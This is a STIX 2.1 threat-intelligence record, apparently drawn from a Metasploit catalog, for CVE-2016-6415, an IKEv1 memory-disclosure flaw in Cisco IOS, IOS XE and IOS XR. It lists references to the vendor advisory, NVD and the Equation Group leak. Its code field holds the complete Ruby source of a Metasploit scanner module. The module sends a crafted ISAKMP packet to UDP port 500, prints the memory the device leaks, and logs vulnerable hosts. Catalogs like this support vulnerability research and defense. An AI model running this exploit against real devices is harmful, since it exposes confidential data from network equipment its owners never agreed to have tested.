{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c4ff51f-e50c-4900-9c8f-0b7721b00677",
    "created": "2024-08-14T16:27:50.680688Z",
    "modified": "2024-08-14T16:27:50.680692Z",
    "name": "Cisco IKE Information Disclosure",
    "description": " A vulnerability in Internet Key Exchange version 1 (IKEv1) packet processing code in Cisco IOS, Cisco IOS XE, and Cisco IOS XR Software could allow an unauthenticated, remote attacker to retrieve memory contents, which could lead to the disclosure of confidential information.  The vulnerability is due to insufficient condition checks in the part of the code that handles IKEv1 security negotiation requests. An attacker could exploit this vulnerability by sending a crafted IKEv1 packet to an affected device configured to accept IKEv1 security negotiation requests. A successful exploit could allow the attacker to retrieve memory contents, which could lead to the disclosure of confidential information. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ike/cisco_ike_benigncertain.rb",
            "external_id": "cisco_ike_benigncertain.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6415"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/adamcaudill/EquationGroupLeak/tree/master/Firewall/TOOLS/BenignCertain/benigncertain-v1110"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160916-ikev1"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-6415"
        },
        {
            "source_name": "reference",
            "url": "https://musalbas.com/2016/08/18/equation-group-benigncertain.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco IKE Information Disclosure',\n      'Description'    => %q{\n        A vulnerability in Internet Key Exchange version 1 (IKEv1) packet\n        processing code in Cisco IOS, Cisco IOS XE, and Cisco IOS XR Software\n        could allow an unauthenticated, remote attacker to retrieve memory\n        contents, which could lead to the disclosure of confidential information.\n\n        The vulnerability is due to insufficient condition checks in the part\n        of the code that handles IKEv1 security negotiation requests.\n        An attacker could exploit this vulnerability by sending a crafted IKEv1\n        packet to an affected device configured to accept IKEv1 security\n        negotiation requests. A successful exploit could allow the attacker\n        to retrieve memory contents, which could lead to the disclosure of\n        confidential information.\n      },\n      'Author'         => [ 'Nixawk' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2016-6415' ],\n          [ 'URL', 'https://github.com/adamcaudill/EquationGroupLeak/tree/master/Firewall/TOOLS/BenignCertain/benigncertain-v1110' ],\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160916-ikev1' ],\n          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2016-6415' ],\n          [ 'URL', 'https://musalbas.com/2016/08/18/equation-group-benigncertain.html' ]\n        ],\n      'DisclosureDate' => '2016-09-29'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(500),\n        OptPath.new('PACKETFILE',\n          [ true, 'The ISAKMP packet file', File.join(Msf::Config.data_directory, 'exploits', 'cve-2016-6415', 'sendpacket.raw') ])\n      ])\n  end\n\n  def run_host(ip)\n    begin\n      isakmp_pkt = File.read(datastore['PACKETFILE'])\n      peer = \"#{ip}:#{datastore['RPORT']}\"\n\n      udp_sock = Rex::Socket::Udp.create(\n        {\n          'Context' => { 'Msf' => framework, 'MsfExploit' => self }\n        }\n      )\n\n      add_socket(udp_sock)\n\n      udp_sock.sendto(isakmp_pkt, ip, datastore['RPORT'].to_i)\n      res = udp_sock.get(3)\n      return unless res && res.length > 36 # ISAKMP + 36 -> Notitication Data...\n\n      # Convert non-printable characters to periods\n      printable_data = res.gsub(/[^[:print:]]/, '.')\n\n      # Show abbreviated data\n      vprint_status(\"Printable info leaked:\\n#{printable_data}\")\n\n      chars = res.unpack('C*')\n      len = (chars[30].to_s(16) + chars[31].to_s(16)).hex\n\n      return if len <= 0\n      print_good(\"#{peer} - IKE response with leak\")\n      report_vuln({\n        :host => ip,\n        :port => datastore['RPORT'],\n        :proto => 'udp',\n        :name => self.name,\n        :refs => self.references,\n        :info => \"Vulnerable to Cisco IKE Information Disclosure\"\n      })\n\n      # NETWORK may return the same packet data.\n      return if res.length < 2500\n      pkt_md5 = ::Rex::Text.md5(isakmp_pkt[isakmp_pkt.length-2500, isakmp_pkt.length])\n      res_md5 = ::Rex::Text.md5(res[res.length-2500, res.length])\n\n      print_warning(\"#{peer} - IKE response is same to payload data\") if pkt_md5 == res_md5\n    rescue\n    ensure\n      udp_sock.close\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-29"
}